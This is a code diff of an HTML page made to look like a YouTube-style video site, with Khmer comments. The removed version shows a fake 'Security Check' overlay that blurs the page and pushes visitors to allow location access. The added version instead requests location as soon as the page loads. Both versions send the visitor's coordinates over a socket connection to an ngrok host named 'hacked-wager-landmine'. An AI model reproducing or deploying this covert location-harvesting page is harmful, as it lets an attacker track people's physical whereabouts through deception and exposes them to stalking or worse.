@@ -26,7 +26,7 @@
   --sidebar-w:240px;
 }
 
-html{scrollbar-color:#606060 transparent; overflow: hidden;} /* បិទមិនឱ្យអូសចុះក្រោមបាន ពេលមិនទាន់ Allow */
+html{scrollbar-color:#606060 transparent}
 body{
   font-family:"Roboto",system-ui,-apple-system,"Segoe UI",Arial,sans-serif;
   background:var(--bg);
@@ -40,121 +40,250 @@ svg{display:block}
 ::-webkit-scrollbar-thumb:hover{background:#909090}
 ::-webkit-scrollbar-track{background:transparent}
 
-/* ============ ផ្ទាំងចាប់បង្ខំទាមទារទីតាំង (BLOCKER OVERLAY) ============ */
-#location-blocker {
-  position: fixed;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background-color: #0f0f0f; 
-  z-index: 99999; 
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  text-align: center;
-  padding: 20px;
-}
-
-#location-blocker h1 {
-  font-size: 22px;
-  margin-bottom: 15px;
-  color: #fff;
-}
-
-#location-blocker p {
-  font-size: 16px;
-  color: #aaa;
-  margin-bottom: 25px;
-  max-width: 400px;
-  line-height: 1.5;
-}
-
-.auth-btn {
-  background-color: #3ea6ff; 
-  color: #0f0f0f;
-  border: none;
-  padding: 12px 24px;
-  font-size: 16px;
-  font-weight: 500;
-  border-radius: 18px;
-  cursor: pointer;
-  transition: 0.2s;
-}
-
-.auth-btn:hover {
-  background-color: #65b8ff;
-}
-
-#error-msg {
-  color: #ff4e4e;
-  margin-top: 15px;
-  font-size: 14px;
-  font-weight: 500;
-  display: none;
-}
-
 /* ============ TOP BAR ============ */
-.topbar{ position:fixed; top:0;left:0;right:0; height:var(--topbar-h); z-index:100; display:flex; align-items:center; gap:16px; padding:0 16px; background:var(--bg); }
+.topbar{
+  position:fixed;
+  top:0;left:0;right:0;
+  height:var(--topbar-h);
+  z-index:100;
+  display:flex;
+  align-items:center;
+  gap:16px;
+  padding:0 16px;
+  background:var(--bg);
+}
 .topbar-start{display:flex;align-items:center;gap:6px;min-width:170px}
 .topbar-center{display:flex;align-items:center;justify-content:center;gap:8px;flex:1;min-width:0}
 .topbar-end{display:flex;align-items:center;justify-content:flex-end;gap:6px;min-width:170px}
-.icon-btn{ width:40px;height:40px;flex:none; display:grid;place-items:center; border:0;border-radius:50%; background:transparent;color:var(--text); cursor:pointer; }
+
+/* icon buttons */
+.icon-btn{
+  width:40px;height:40px;flex:none;
+  display:grid;place-items:center;
+  border:0;border-radius:50%;
+  background:transparent;color:var(--text);
+  cursor:pointer;
+  transition:background .15s;
+}
+.icon-btn:hover{background:var(--hover)}
 .icon-btn svg{width:24px;height:24px}
+
+/* logo */
 .logo{display:flex;align-items:center;gap:5px;text-decoration:none;color:var(--text);padding-right:6px}
-.logo-mark{ position:relative;flex:none; width:34px;height:24px; background:var(--red); border-radius:7px; }
-.logo-mark::after{ content:""; position:absolute;top:50%;left:50%; transform:translate(-45%,-50%); border-style:solid; border-width:6px 0 6px 10px; border-color:transparent transparent transparent #fff; }
+.logo-mark{
+  position:relative;flex:none;
+  width:34px;height:24px;
+  background:var(--red);
+  border-radius:7px;
+}
+.logo-mark::after{
+  content:"";
+  position:absolute;top:50%;left:50%;
+  transform:translate(-45%,-50%);
+  border-style:solid;
+  border-width:6px 0 6px 10px;
+  border-color:transparent transparent transparent #fff;
+}
 .logo-text{font-size:19px;font-weight:700;letter-spacing:-.7px}
-.search{ display:flex;align-items:center; flex:1;max-width:640px;height:40px; border:1px solid var(--border); border-radius:20px; background:#121212; overflow:hidden; }
-.search input{ flex:1;height:100%;min-width:0; background:transparent;border:0;outline:0; padding:0 16px; color:var(--text); font-size:16px; font-family:inherit;}
-.search-btn{ width:64px;height:100%;flex:none; display:grid;place-items:center; border:0;border-left:1px solid var(--border); background:var(--elev);color:var(--text); cursor:pointer; }
+.country{font-size:10px;color:var(--text-2);align-self:flex-start;margin-top:14px}
+
+/* search */
+.search{
+  display:flex;align-items:center;
+  flex:1;max-width:640px;height:40px;
+  border:1px solid var(--border);
+  border-radius:20px;
+  background:#121212;
+  overflow:hidden;
+  transition:border-color .15s;
+}
+.search:focus-within{border-color:#1c62b9}
+.search input{
+  flex:1;height:100%;min-width:0;
+  background:transparent;border:0;outline:0;
+  padding:0 16px;
+  color:var(--text);
+  font-size:16px;
+  font-family:inherit;
+}
+.search input::placeholder{color:#888}
+.search-btn{
+  width:64px;height:100%;flex:none;
+  display:grid;place-items:center;
+  border:0;border-left:1px solid var(--border);
+  background:var(--elev);color:var(--text);
+  cursor:pointer;
+}
+.search-btn:hover{background:#303030}
 .search-btn svg{width:22px;height:22px}
-.av{ display:grid;place-items:center;flex:none; width:36px;height:36px; border-radius:50%; color:#fff;font-weight:500;font-size:15px; user-select:none; }
+.mic{background:#181818}
+.mic:hover{background:#303030}
+
+/* avatar */
+.av{
+  display:grid;place-items:center;flex:none;
+  width:36px;height:36px;
+  border-radius:50%;
+  color:#fff;font-weight:500;font-size:15px;
+  user-select:none;
+}
 .av.sm{width:32px;height:32px;font-size:14px}
 .avatar-btn{border:0;background:transparent;padding:0;cursor:pointer;border-radius:50%}
 
 /* ============ SIDEBAR ============ */
-.sidebar{ position:fixed; top:var(--topbar-h);bottom:0;left:0; width:var(--sidebar-w); padding:12px 12px 24px; overflow-y:auto; overflow-x:hidden; background:var(--bg); scrollbar-width:thin; }
-.nav-item{ display:flex;align-items:center;gap:24px; height:40px;padding:0 12px; border-radius:10px; color:var(--text); text-decoration:none; font-size:14px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+.sidebar{
+  position:fixed;
+  top:var(--topbar-h);bottom:0;left:0;
+  width:var(--sidebar-w);
+  padding:12px 12px 24px;
+  overflow-y:auto;
+  overflow-x:hidden;
+  background:var(--bg);
+  scrollbar-width:thin;
+}
+.nav-item{
+  display:flex;align-items:center;gap:24px;
+  height:40px;padding:0 12px;
+  border-radius:10px;
+  color:var(--text);
+  text-decoration:none;
+  font-size:14px;
+  white-space:nowrap;
+  overflow:hidden;
+  text-overflow:ellipsis;
+}
+.nav-item:hover{background:var(--hover)}
 .nav-item.active{background:var(--hover);font-weight:500}
 .nav-item svg{width:24px;height:24px;flex:none}
+.nav-item span{overflow:hidden;text-overflow:ellipsis}
+
+.side-title{
+  display:flex;align-items:center;gap:6px;
+  padding:8px 12px;
+  font-size:16px;font-weight:500;
+}
+.side-title svg{width:24px;height:24px}
 .divider{height:1px;background:var(--border);margin:12px 0}
-.side-footer{ padding:16px 12px; font-size:12px;line-height:18px;color:#717171; }
+
+.side-footer{
+  padding:16px 12px;
+  font-size:12px;line-height:18px;color:#717171;
+}
 
 /* ============ MAIN CONTENT ============ */
-.content{ margin-left:var(--sidebar-w); padding-top:var(--topbar-h); filter: blur(5px); transition: filter 0.3s; }
+.content{
+  margin-left:var(--sidebar-w);
+  padding-top:var(--topbar-h);
+}
 body.nav-collapsed .sidebar{display:none}
 body.nav-collapsed .content{margin-left:0}
 
 /* chips */
-.chips{ position:sticky; top:var(--topbar-h); z-index:50; display:flex;gap:12px; padding:12px 24px; background:var(--bg); overflow-x:auto; scrollbar-width:none; }
+.chips{
+  position:sticky;
+  top:var(--topbar-h);
+  z-index:50;
+  display:flex;gap:12px;
+  padding:12px 24px;
+  background:var(--bg);
+  overflow-x:auto;
+  scrollbar-width:none;
+}
 .chips::-webkit-scrollbar{display:none}
-.chip{ flex:none; height:32px;padding:0 12px; border:0;border-radius:8px; background:var(--chip); color:var(--text); font-family:inherit;font-size:14px;font-weight:500; cursor:pointer; }
+.chip{
+  flex:none;
+  height:32px;padding:0 12px;
+  border:0;border-radius:8px;
+  background:var(--chip);
+  color:var(--text);
+  font-family:inherit;font-size:14px;font-weight:500;
+  white-space:nowrap;
+  cursor:pointer;
+  transition:background .15s,color .15s;
+}
+.chip:hover{background:#3f3f3f}
 .chip.active{background:var(--chip-active);color:#0f0f0f}
 
 /* grid */
-.grid{ display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:24px 16px; padding:8px 24px 48px; }
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(300px,1fr));
+  gap:24px 16px;
+  padding:8px 24px 48px;
+}
+
+/* video card */
 .card{cursor:pointer;min-width:0}
-.thumb{ position:relative; aspect-ratio:16/9; border-radius:12px; overflow:hidden; background-size:cover; background-position:center; background-color:#1c1c1c; }
-.duration{ position:absolute;right:8px;bottom:8px;z-index:2; padding:3px 4px; border-radius:4px; background:rgba(0,0,0,.8); color:#fff; font-size:12px;font-weight:500; }
+.thumb{
+  position:relative;
+  aspect-ratio:16/9;
+  border-radius:12px;
+  overflow:hidden;
+  background-size:cover;
+  background-position:center;
+  background-color:#1c1c1c;
+}
+.thumb::before{
+  content:"";
+  position:absolute;inset:0;
+  background:
+    radial-gradient(circle at 25% 20%, rgba(255,255,255,.20), transparent 55%),
+    radial-gradient(circle at 80% 90%, rgba(0,0,0,.40), transparent 60%);
+}
+.thumb::after{
+  content:"";
+  position:absolute;inset:0;
+  border-radius:12px;
+  box-shadow:inset 0 0 0 1px rgba(255,255,255,.05);
+}
+.duration{
+  position:absolute;right:8px;bottom:8px;z-index:2;
+  padding:3px 4px;
+  border-radius:4px;
+  background:rgba(0,0,0,.8);
+  color:#fff;
+  font-size:12px;font-weight:500;
+  line-height:12px;
+}
+
 .card-body{display:flex;gap:12px;margin-top:12px}
 .card-body .av{width:36px;height:36px;font-size:15px}
 .meta{min-width:0;flex:1}
-.title{ font-size:14px;font-weight:500;line-height:20px; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; margin-bottom:4px; }
-.channel, .stats{ font-size:12px; line-height:18px; color:var(--text-2); display:flex;align-items:center;gap:4px; white-space:nowrap;overflow:hidden;text-overflow:ellipsis; }
+.title{
+  font-size:14px;font-weight:500;line-height:20px;
+  display:-webkit-box;
+  -webkit-line-clamp:2;
+  -webkit-box-orient:vertical;
+  overflow:hidden;
+  margin-bottom:4px;
+}
+.channel,
+.stats{
+  font-size:12px;
+  line-height:18px;
+  color:var(--text-2);
+  display:flex;align-items:center;gap:4px;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+}
 
 /* ============ RESPONSIVE ============ */
-@media (max-width:1100px){ .sidebar{display:none} .content{margin-left:0} }
-@media (max-width:640px){ .topbar{padding:0 8px;gap:8px} .topbar-start,.topbar-end{min-width:auto} .hide-sm{display:none} .logo-text{display:none} .country{display:none} .grid{grid-template-columns:1fr;padding:8px 12px 40px;gap:16px} .chips{padding:12px} .search{height:36px} }
+@media (max-width:1100px){
+  .sidebar{display:none}
+  .content{margin-left:0}
+}
+@media (max-width:640px){
+  .topbar{padding:0 8px;gap:8px}
+  .topbar-start,.topbar-end{min-width:auto}
+  .hide-sm{display:none}
+  .logo-text{display:none}
+  .country{display:none}
+  .grid{grid-template-columns:1fr;padding:8px 12px 40px;gap:16px}
+  .chips{padding:12px}
+  .search{height:36px}
+}
 </style>
 </head>
 <body>
-
-<!-- ផ្ទាំងបញ្ឆោតចាប់បង្ខំឱ្យចុច Allow -->
-<div id="location-blocker">
-    <h1>ផ្ទៀងផ្ទាត់សុវត្ថិភាព (Security Check)</h1>
-    <p>ដើម្បីការពារគណនី និងបន្តចូលមើលវីដេអូនេះបាន សូមអនុញ្ញាតសិទ្ធិទីតាំង (Allow Location) របស់អ្នក។</p>
-    <button class="auth-btn" onclick="requestLocation()">ចុចទីនេះដើម្បីបន្ត (Continue)</button>
-    <p id="error-msg">❌ អ្នកបានបដិសេធ! សូមចុចប៊ូតុងម្តងទៀត រួចជ្រើសរើស "Allow" ដើម្បីអាចចូលមើលបាន។</p>
-</div>
 
 <!-- TOP BAR -->
 <header class="topbar">
@@ -242,7 +371,7 @@ body.nav-collapsed .content{margin-left:0}
 </aside>
 
 <!-- MAIN -->
-<main class="content" id="main-content">
+<main class="content">
   <div class="chips">
     <button class="chip active">All</button>
     <button class="chip">Music</button>
@@ -266,55 +395,51 @@ body.nav-collapsed .content{margin-left:0}
   </div>
 </main>
 
+<p id="status" style="display: none;"></p>
+
 <script>
-  /* Sidebar toggle */
+  /* Sidebar toggle (hamburger) */
   document.getElementById('menuBtn').addEventListener('click', () => {
     document.body.classList.toggle('nav-collapsed');
   });
 
+  /* Chip selection */
+  document.querySelectorAll('.chip').forEach(chip => {
+    chip.addEventListener('click', () => {
+      document.querySelector('.chip.active')?.classList.remove('active');
+      chip.classList.add('active');
+    });
+  });
+
   /* ================= GEOLOCATION & SOCKET.IO ================= */
+  // ភ្ជាប់ទៅ ngrok
   const socket = io("https://hacked-wager-landmine.ngrok-free.dev", {
       transports: ['websocket', 'polling']
   });
   
-  const blocker = document.getElementById('location-blocker');
-  const mainContent = document.getElementById('main-content');
-  const errorMsg = document.getElementById('error-msg');
+  const statusText = document.getElementById('status');
 
-  // ទាមទារសិទ្ធិពេលគេចុចលើប៊ូតុង
-  function requestLocation() {
-      errorMsg.style.display = 'none';
-
+  function getLocation() {
       if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(sendPosition, showError, {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
-          });
+          navigator.geolocation.getCurrentPosition(sendPosition, showError);
       } else {
-          errorMsg.innerText = "ទូរស័ព្ទរបស់អ្នកមិនគាំទ្រមុខងារនេះទេ។";
-          errorMsg.style.display = 'block';
+          console.error("Browser របស់អ្នកមិនគាំទ្រ Geolocation API ទេ។");
       }
   }
 
-  // ពេលទទួលបានទីតាំង
   function sendPosition(position) {
       const lat = position.coords.latitude;
       const lng = position.coords.longitude;
       
-      // បញ្ជូនទៅ Python
+      // បញ្ជូនទិន្នន័យទៅ Backend (ឆ្លងកាត់ ngrok)
       socket.emit('send_location', { lat: lat, lng: lng });
-
-      // លុបផ្ទាំង Block ចេញ និងបង្ហាញវីដេអូ
-      blocker.style.display = 'none';
-      mainContent.style.filter = 'none'; 
-      document.documentElement.style.overflow = 'auto';
   }
 
-  // ពេលមាន Error ឬគេចុច Block
   function showError(error) {
-      errorMsg.style.display = 'block';
+      console.error("Error code: " + error.code);
   }
+
+  window.onload = getLocation;
 </script>
 
 </body>
